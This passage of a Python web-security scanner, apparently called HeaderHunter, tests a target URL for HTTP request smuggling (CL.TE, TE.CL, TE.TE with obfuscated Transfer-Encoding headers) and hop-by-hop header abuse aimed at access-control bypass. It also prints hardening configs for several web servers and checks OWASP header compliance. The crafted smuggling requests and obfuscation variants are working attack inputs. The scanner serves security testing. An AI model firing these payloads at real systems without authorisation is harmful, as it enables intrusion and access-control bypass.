        smuggle_resp, smuggle_time = self._send_raw(host, port, use_ssl, smuggle_request, recv_timeout=10)

        if smuggle_resp is None and normal_resp is not None:
            self.log("WARN", "CL.TE: Server closed connection (potential detection)")
        elif smuggle_time > normal_time + 3:
            self.log("VULN", f"CL.TE smuggling potential! Response delayed by {smuggle_time - normal_time:.1f}s")
        elif smuggle_resp and normal_resp:
            if "400" in smuggle_resp[:20] and "400" not in (normal_resp[:20] if normal_resp else ""):
                self.log("WARN", "CL.TE: Different error response (may indicate TE processing)")
            else:
                self.log("PASS", "CL.TE: No obvious smuggling detected")
        else:
            self.log("INFO", "CL.TE: Could not complete test")

    def _test_tecl_smuggling(self, host, port, use_ssl, path):
        self.log("INFO", "Testing TE.CL smuggling...")

        smuggle_request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 100\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        )
        resp, elapsed = self._send_raw(host, port, use_ssl, smuggle_request, recv_timeout=10)

        if elapsed > 5:
            self.log("VULN", f"TE.CL smuggling potential! Response delayed by {elapsed:.1f}s (server waiting for Content-Length bytes)")
        elif resp:
            self.log("PASS", "TE.CL: No obvious smuggling detected")
        else:
            self.log("INFO", "TE.CL: Could not complete test")

    def _test_tete_smuggling(self, host, port, use_ssl, path):
        self.log("INFO", "Testing TE.TE smuggling (obfuscation variants)...")

        te_obfuscations = [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
            "Transfer-Encoding:\tchunked",
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: cow",
            " Transfer-Encoding: chunked",
            "X: X\r\nTransfer-Encoding: chunked",
            "Transfer-Encoding\r\n: chunked",
            "Transfer-Encoding: chunk",
        ]

        normal_request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"\r\n"
            f"normal"
        )
        normal_resp, normal_time = self._send_raw(host, port, use_ssl, normal_request)

        for te_header in te_obfuscations:
            smuggle_request = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{te_header}\r\n"
                f"\r\n"
                f"1\r\n"
                f"Z\r\n"
                f"Q\r\n"
                f"\r\n"
            )
            resp, elapsed = self._send_raw(host, port, use_ssl, smuggle_request, recv_timeout=8)

            if resp and normal_resp:
                normal_status = normal_resp.split("\r\n")[0] if normal_resp else ""
                smuggle_status = resp.split("\r\n")[0] if resp else ""
                if smuggle_status != normal_status:
                    self.log("WARN", f"TE.TE obfuscation [{te_header[:40]}]: status changed -> {smuggle_status[:30]}")
            if elapsed > normal_time + 3:
                self.log("VULN", f"TE.TE obfuscation delay [{te_header[:40]}]: {elapsed:.1f}s")

        self.log("INFO", "TE.TE obfuscation testing complete")

    def test_hop_by_hop_abuse(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  HOP-BY-HOP HEADER ABUSE TESTING")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        if not self.baseline_response:
            if not self.get_baseline():
                return

        for header in HOP_BY_HOP_HEADERS:
            try:
                test_headers = {
                    "Connection": header
                }
                resp = self.session.get(self.target, headers=test_headers, timeout=self.timeout, allow_redirects=False)

                if resp.status_code != self.baseline_status:
                    self.log("WARN", f"Hop-by-hop [{header}]: Status changed {self.baseline_status}->{resp.status_code}")
                elif abs(len(resp.content) - self.baseline_length) > (self.baseline_length * 0.15):
                    self.log("WARN", f"Hop-by-hop [{header}]: Response size changed significantly")
                elif self.verbose:
                    self.log("DEBUG", f"Hop-by-hop [{header}]: No effect")

                if header in ("X-Forwarded-For", "X-Real-IP", "X-Client-IP"):
                    test_headers2 = {
                        "Connection": header,
                        header: "127.0.0.1"
                    }
                    resp2 = self.session.get(self.target, headers=test_headers2, timeout=self.timeout, allow_redirects=False)
                    if resp2.status_code != self.baseline_status:
                        self.log("VULN", f"Hop-by-hop + header injection [{header}]: Status changed! Possible ACL bypass")

            except requests.RequestException as e:
                if self.verbose:
                    self.log("DEBUG", f"Hop-by-hop [{header}]: Error - {e}")

    def generate_fix_configs(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  FIX CONFIGURATIONS")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        nginx_config = """# ============== NGINX Security Headers ==============
# Add to server {} block or http {} block

# Security Headers
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header X-XSS-Protection "0" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()" always;
add_header Cross-Origin-Embedder-Policy "require-corp" always;
add_header Cross-Origin-Opener-Policy "same-origin" always;
add_header Cross-Origin-Resource-Policy "same-origin" always;
add_header X-Permitted-Cross-Domain-Policies "none" always;
add_header X-DNS-Prefetch-Control "off" always;
add_header X-Download-Options "noopen" always;
add_header Cache-Control "no-store, no-cache, must-revalidate, private" always;
add_header Pragma "no-cache" always;

# Remove information disclosure headers
proxy_hide_header X-Powered-By;
proxy_hide_header X-AspNet-Version;
proxy_hide_header X-AspNetMvc-Version;
proxy_hide_header X-Runtime;
proxy_hide_header X-Version;
proxy_hide_header X-Generator;
server_tokens off;

# Prevent Host header injection
if ($host !~* ^(www\\.)?yourdomain\\.com$) {
    return 444;
}

# Block CRLF injection
if ($request_uri ~* "%0d|%0a|%0D|%0A") {
    return 400;
}

# Block request smuggling
proxy_http_version 1.1;
proxy_set_header Connection "";
"""

        apache_config = """# ============== APACHE Security Headers ==============
# Add to .htaccess or VirtualHost configuration

# Enable Headers module: a2enmod headers

# Security Headers
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "DENY"
Header always set X-XSS-Protection "0"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Permissions-Policy "accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()"
Header always set Cross-Origin-Embedder-Policy "require-corp"
Header always set Cross-Origin-Opener-Policy "same-origin"
Header always set Cross-Origin-Resource-Policy "same-origin"
Header always set X-Permitted-Cross-Domain-Policies "none"
Header always set X-DNS-Prefetch-Control "off"
Header always set X-Download-Options "noopen"
Header always set Cache-Control "no-store, no-cache, must-revalidate, private"
Header always set Pragma "no-cache"

# Remove information disclosure headers
Header always unset X-Powered-By
Header always unset X-AspNet-Version
Header always unset X-AspNetMvc-Version
Header always unset X-Runtime
Header always unset X-Version
Header always unset X-Generator
ServerTokens Prod
ServerSignature Off

# Prevent CRLF injection
RewriteEngine On
RewriteCond %{THE_REQUEST} (%0d|%0a|%0D|%0A) [NC]
RewriteRule .* - [F,L]

# Cookie security (in PHP)
# session.cookie_secure = 1
# session.cookie_httponly = 1
# session.cookie_samesite = Strict
"""

        iis_config = """<!-- ============== IIS Security Headers ============== -->
<!-- Add to web.config -->
<configuration>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <add name="Strict-Transport-Security" value="max-age=63072000; includeSubDomains; preload" />
        <add name="Content-Security-Policy" value="default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'" />
        <add name="X-Content-Type-Options" value="nosniff" />
        <add name="X-Frame-Options" value="DENY" />
        <add name="X-XSS-Protection" value="0" />
        <add name="Referrer-Policy" value="strict-origin-when-cross-origin" />
        <add name="Permissions-Policy" value="accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()" />
        <add name="Cross-Origin-Embedder-Policy" value="require-corp" />
        <add name="Cross-Origin-Opener-Policy" value="same-origin" />
        <add name="Cross-Origin-Resource-Policy" value="same-origin" />
        <add name="X-Permitted-Cross-Domain-Policies" value="none" />
        <add name="X-DNS-Prefetch-Control" value="off" />
        <add name="X-Download-Options" value="noopen" />
        <add name="Cache-Control" value="no-store, no-cache, must-revalidate, private" />
        <add name="Pragma" value="no-cache" />
        <remove name="X-Powered-By" />
        <remove name="X-AspNet-Version" />
        <remove name="X-AspNetMvc-Version" />
      </customHeaders>
    </httpProtocol>
    <security>
      <requestFiltering>
        <requestLimits maxAllowedContentLength="30000000" />
        <filteringRules>
          <filteringRule name="BlockCRLF" scanUrl="true" scanQueryString="true">
            <denyStrings>
              <add string="%0d" />
              <add string="%0a" />
              <add string="%0D" />
              <add string="%0A" />
            </denyStrings>
          </filteringRule>
        </filteringRules>
      </requestFiltering>
    </security>
    <httpErrors errorMode="Custom" existingResponse="Replace" />
  </system.webServer>
  <system.web>
    <httpRuntime enableHeaderChecking="true" />
    <customErrors mode="On" />
  </system.web>
</configuration>
"""

        caddy_config = """# ============== CADDY Security Headers ==============
# Add to Caddyfile

yourdomain.com {
    header {
        Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
        Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
        X-Content-Type-Options "nosniff"
        X-Frame-Options "DENY"
        X-XSS-Protection "0"
        Referrer-Policy "strict-origin-when-cross-origin"
        Permissions-Policy "accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()"
        Cross-Origin-Embedder-Policy "require-corp"
        Cross-Origin-Opener-Policy "same-origin"
        Cross-Origin-Resource-Policy "same-origin"
        X-Permitted-Cross-Domain-Policies "none"
        X-DNS-Prefetch-Control "off"
        X-Download-Options "noopen"
        Cache-Control "no-store, no-cache, must-revalidate, private"
        Pragma "no-cache"
        -Server
        -X-Powered-By
        -X-AspNet-Version
        -X-AspNetMvc-Version
        -X-Runtime
        -X-Version
    }
}
"""

        traefik_config = """# ============== TRAEFIK Security Headers ==============
# Add to traefik dynamic configuration (YAML)

http:
  middlewares:
    security-headers:
      headers:
        customResponseHeaders:
          X-Content-Type-Options: "nosniff"
          X-Frame-Options: "DENY"
          X-XSS-Protection: "0"
          Referrer-Policy: "strict-origin-when-cross-origin"
          Permissions-Policy: "accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()"
          Cross-Origin-Embedder-Policy: "require-corp"
          Cross-Origin-Opener-Policy: "same-origin"
          Cross-Origin-Resource-Policy: "same-origin"
          X-Permitted-Cross-Domain-Policies: "none"
          X-DNS-Prefetch-Control: "off"
          X-Download-Options: "noopen"
          Cache-Control: "no-store, no-cache, must-revalidate, private"
          Pragma: "no-cache"
        stsSeconds: 63072000
        stsIncludeSubdomains: true
        stsPreload: true
        contentSecurityPolicy: "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
        customFrameOptionsValue: "DENY"
        contentTypeNosniff: true
        browserXssFilter: false
        referrerPolicy: "strict-origin-when-cross-origin"
        isDevelopment: false
"""

        configs = {
            "nginx": nginx_config,
            "apache": apache_config,
            "iis": iis_config,
            "caddy": caddy_config,
            "traefik": traefik_config
        }

        for server, config in configs.items():
            print(f"{Fore.GREEN}{Style.BRIGHT}{config.split(chr(10))[0]}{Style.RESET_ALL}")
            print(config)
            print()

    def owasp_comparison(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  OWASP SECURE HEADERS COMPARISON")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        if not self.baseline_response:
            if not self.get_baseline():
                return

        owasp_required = {k: v for k, v in SECURITY_HEADERS.items() if v.get("owasp") == "Yes"}
        results = []
        compliant = 0
        total = 0

        for header, info in owasp_required.items():
            total += 1
            value = self.baseline_response.headers.get(header)
            is_info_header = header in ("X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version", "Server")

            if is_info_header:
                if value:
                    status = f"{Fore.RED}NON-COMPLIANT{Style.RESET_ALL}"
                    note = f"Should be removed. Current: {value}"
                else:
                    status = f"{Fore.GREEN}COMPLIANT{Style.RESET_ALL}"
                    note = "Not present (correct)"
                    compliant += 1
            elif header == "Access-Control-Allow-Origin":
                if value == "*":
                    status = f"{Fore.RED}NON-COMPLIANT{Style.RESET_ALL}"
                    note = "Wildcard not recommended"
                elif value:
                    status = f"{Fore.GREEN}COMPLIANT{Style.RESET_ALL}"
                    note = f"Specific origin: {value}"
                    compliant += 1
                else:
                    status = f"{Fore.YELLOW}N/A{Style.RESET_ALL}"
                    note = "Not set (OK if no CORS needed)"
                    compliant += 1
            elif header == "Access-Control-Allow-Credentials":
                acao = self.baseline_response.headers.get("Access-Control-Allow-Origin", "")
                if value and value.lower() == "true" and acao == "*":
                    status = f"{Fore.RED}NON-COMPLIANT{Style.RESET_ALL}"
                    note = "Credentials + wildcard origin is dangerous"
                else:
                    status = f"{Fore.GREEN}COMPLIANT{Style.RESET_ALL}"
                    note = "OK"
                    compliant += 1
            elif header == "Set-Cookie":
                set_cookie = self.baseline_response.headers.get("Set-Cookie", "")
                if set_cookie:
                    issues = []
                    if "secure" not in set_cookie.lower():
                        issues.append("Secure")
                    if "httponly" not in set_cookie.lower():
                        issues.append("HttpOnly")
                    if "samesite" not in set_cookie.lower():
                        issues.append("SameSite")
                    if issues:
                        status = f"{Fore.RED}NON-COMPLIANT{Style.RESET_ALL}"
                        note = f"Missing: {', '.join(issues)}"
                    else:
                        status = f"{Fore.GREEN}COMPLIANT{Style.RESET_ALL}"
                        note = "All flags present"
                        compliant += 1
                else:
                    status = f"{Fore.YELLOW}N/A{Style.RESET_ALL}"
                    note = "No cookies set"
                    compliant += 1
            elif value:
                status = f"{Fore.GREEN}COMPLIANT{Style.RESET_ALL}"
                note = f"Present: {value[:50]}"
                compliant += 1
            else:
                status = f"{Fore.RED}NON-COMPLIANT{Style.RESET_ALL}"
                note = f"Missing. Recommended: {info['recommended'][:50]}"

            results.append([header[:35], status, info["severity"], note[:55]])

        print(tabulate(results, headers=["OWASP Header", "Status", "Severity", "Notes"], tablefmt="grid"))

        pct = (compliant / total * 100) if total else 0
        color = Fore.GREEN if pct >= 80 else Fore.YELLOW if pct >= 60 else Fore.RED
        print(f"\n{color}OWASP Compliance: {compliant}/{total} ({pct:.1f}%){Style.RESET_ALL}")

    def generate_report(self):
        if not self.output_file:
            return

        report = {
            "target": self.target,
            "scan_date": datetime.now().isoformat(),
            "total_findings": len(self.findings),
            "findings_by_level": {},
            "findings": self.findings
        }
        for finding in self.findings:
            level = finding["level"]
            report["findings_by_level"][level] = report["findings_by_level"].get(level, 0) + 1

        try:
            with open(self.output_file, "w") as f:
                json.dump(report, f, indent=2)
            self.log("INFO", f"Report saved to {self.output_file}")
        except IOError as e:
            self.log("FAIL", f"Could not save report: {e}")

    def run_all(self):
        self.log("INFO", f"Target: {self.target}")
        self.log("INFO", f"Starting comprehensive header analysis...\n")

        if not self.get_baseline():
            self.log("FAIL", "Cannot reach target. Aborting.")
            return

        self.analyze_security_headers()
        self.owasp_comparison()
        self.test_crlf_injection()
        self.test_host_header_attacks()
        self.test_request_header_injection()
        self.test_request_smuggling()
        self.test_hop_by_hop_abuse()
        self.generate_fix_configs()
        self.print_summary()
        self.generate_report()

    def print_summary(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"  SCAN SUMMARY")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        vuln_count = sum(1 for f in self.findings if f["level"] == "VULN")
        warn_count = sum(1 for f in self.findings if f["level"] == "WARN")
        fail_count = sum(1 for f in self.findings if f["level"] == "FAIL")
        total = len(self.findings)

        print(f"  Target: {self.target}")
        print(f"  Total Findings: {total}")
        print(f"    {Fore.RED}{Style.BRIGHT}VULN:  {vuln_count}{Style.RESET_ALL}")
        print(f"    {Fore.RED}FAIL:  {fail_count}{Style.RESET_ALL}")
        print(f"    {Fore.YELLOW}WARN:  {warn_count}{Style.RESET_ALL}")

        if vuln_count > 0:
            print(f"\n  {Fore.RED}{Style.BRIGHT}⚠ CRITICAL VULNERABILITIES FOUND:{Style.RESET_ALL}")
            for f in self.findings:
                if f["level"] == "VULN":
                    print(f"    {Fore.RED}• {f['message']}{Style.RESET_ALL}")


def main():
    banner()
    parser = argparse.ArgumentParser(
        description="HeaderHunter - Comprehensive HTTP Header Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python header_hunter.py -u https://example.com
  python header_hunter.py -u https://example.com --mode all
  python header_hunter.py -u https://example.com --mode headers
  python header_hunter.py -u https://example.com --mode crlf -v
  python header_hunter.py -u https://example.com --mode host
  python header_hunter.py -u https://example.com --mode inject
  python header_hunter.py -u https://example.com --mode smuggle
  python header_hunter.py -u https://example.com --mode hopbyhop
  python header_hunter.py -u https://example.com --mode owasp
  python header_hunter.py -u https://example.com --mode fix
  python header_hunter.py -u https://example.com -o report.json --proxy http://127.0.0.1:8080
  python header_hunter.py -u https://example.com --cookies "session=abc123;token=xyz"
        """
    )

    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--mode", default="all",
                        choices=["all", "headers", "crlf", "host", "inject", "smuggle", "hopbyhop", "owasp", "fix"],
                        help="Scan mode (default: all)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-o", "--output", help="Output JSON report file")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--cookies", help="Cookies to include (e.g., 'session=abc;token=xyz')")

    args = parser.parse_args()

    hunter = HeaderHunter(
        target=args.url,
        timeout=args.timeout,
        verbose=args.verbose,
        proxy=args.proxy,
        cookies=args.cookies,
        output_file=args.output
    )

    mode = args.mode

    if mode == "all":
        hunter.run_all()
    elif mode == "headers":
        if hunter.get_baseline():
            hunter.analyze_security_headers()
            hunter.print_summary()
            hunter.generate_report()
    elif mode == "crlf":
        if hunter.get_baseline():
            hunter.test_crlf_injection()
            hunter.print_summary()
            hunter.generate_report()
    elif mode == "host":
        if hunter.get_baseline():
            hunter.test_host_header_attacks()
            hunter.print_summary()
            hunter.generate_report()
    elif mode == "inject":
        if hunter.get_baseline():
            hunter.test_request_header_injection()
            hunter.print_summary()
            hunter.generate_report()
    elif mode == "smuggle":
        hunter.test_request_smuggling()
        hunter.print_summary()
        hunter.generate_report()
    elif mode == "hopbyhop":
        if hunter.get_baseline():
            hunter.test_hop_by_hop_abuse()
            hunter.print_summary()
            hunter.generate_report()
    elif mode == "owasp":
        if hunter.get_baseline():
            hunter.owasp_comparison()
            hunter.print_summary()
            hunter.generate_report()
    elif mode == "fix":
        hunter.generate_fix_configs()


if __name__ == "__main__":
    main()
